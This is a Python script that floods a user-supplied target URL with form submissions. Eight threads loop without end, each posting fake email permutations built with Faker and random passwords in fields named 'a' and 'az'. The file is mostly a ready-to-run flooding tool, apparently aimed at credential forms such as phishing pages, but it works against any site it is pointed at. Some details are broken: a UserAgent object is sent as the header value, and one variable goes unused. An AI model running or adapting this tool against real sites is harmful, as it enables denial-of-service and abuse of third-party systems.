import random
import string
import requests
import threading
from typing import List
from faker import Faker
from itertools import permutations
from fake_useragent import UserAgent


alphabet = string.ascii_letters + string.digits + string.punctuation
domains = ['@googlemail.com', "@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"]
MAX_THREADS = 8 # Multithreading is not real in python, therefore there's barely any gain from more
fake = Faker()


def add_suffixes(permutated: List[str], suffixes: List[str], service: str) -> List[str]:
    """
    Adds email suffixes and service to permutated usernames.
    :param permutated: list of email permutation prefixes.
    :param suffixes: list of email domains.
    :param service: optional service - gmail allows adding + followed by string after username, ex. test+netflix@gmail.com
    :return: email permutations with domain suffixes.
    """
    usernames = []
    if len(service):
        permutated = [f'{x}+{service}' for x in permutated]
    for suffix in suffixes:
        usernames.extend([f'{x}{suffix}' for x in permutated])
    return usernames


def generate_random_emails() -> List[str]:
    """
    Generates random email addresses.
    :return: a list of generated (unique) emails
    """
    global fake, domains
    first  = fake.first_name().lower()
    last = fake.last_name().lower()
    middle = random.choice(['_', '.', ''])
    emails = [random.choice([str(random.randint(1, 99)), '']) for _ in range(3)]
    emails.extend([first, last, middle])
    emails = list(filter(len, emails))
    # Generate permutations
    emails = list(set(permutations(emails)))
    emails = [''.join(x) for x in emails]
    # Add domains
    return add_suffixes(emails, domains, '')


def generate_random_password(max_len: int = 50) -> str:
    """
    Generate a random password up to the given max len.
    :param max_len: maximum password length, default is 50.
    :return: the generated password.
    """
    global alphabet
    pw_len = random.randint(8, max_len)
    return ''.join(random.choice(alphabet) for i in range(pw_len))


def send_posts(url, location):
    global USER_AGENTS
    while True:
        emails = generate_random_emails()
        for email in emails:
            password = generate_random_password()
            data = {
                "a": email,
                "az": password
            }
            user_agent = UserAgent()
            headers = {
                'User-Agent': user_agent
            }
            response = requests.post(url, headers=headers, data=data)
            # Dont comment in during execution. Console logs require locking, slowing down multithreading.
            #print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")


def main():
    global MAX_THREADS
    URL = input("Enter the URL of the target you want to flood: ")
    threads = []
    locations = ["en_US", "en_GB", "it_IT", "en_IE"]

    for i in range(MAX_THREADS):
        location = random.choice(locations)
        t = threading.Thread(target=send_posts, args=(URL, location))
        t.daemon = True
        threads.append(t)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()